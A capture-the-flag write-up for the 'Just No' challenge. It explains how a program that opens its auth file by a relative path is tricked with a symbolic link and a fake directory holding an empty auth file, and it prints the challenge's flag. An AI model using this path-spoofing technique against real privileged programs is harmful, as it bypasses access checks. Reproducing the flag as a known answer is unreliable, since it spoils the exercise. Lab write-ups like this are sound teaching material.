## Just No - 40

### Description

A program at /problems/ab718be873f8a7efe966f4ed5af749eb has access to a flag but refuses to share it. Can you convince it otherwise?

### Hint

  - Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

### Write up

    FILE* authf = fopen("../../problems/ab718be873f8a7efe966f4ed5af749eb/auth","r");

By looking at justno.c file, only when the content of the `auth` file is not 'no', the program outputs the flag.

We can't edit the auth file, but when opening the auth file, it uses relative address, so we can deceive the address by using symbolic link.

    $ ln -s /problems/ab718be873f8a7efe966f4ed5af749eb/justno ~/a/a/justno

Make a symbolic link of justno program.

    $ mkdir ./problems/ab718be873f8a7efe966f4ed5af749eb
    $ touch ./problems/ab718be873f8a7efe966f4ed5af749eb/auth

Make fake direcotry and fake auth file.

Now run the symbolic link of justno program.

    $ ./justno
    Oh. Well the auth file doesn't say no anymore so... Here's the flag: 3a7cbd7c24f7d5369308333b045382e7

> 3a7cbd7c24f7d5369308333b045382e7
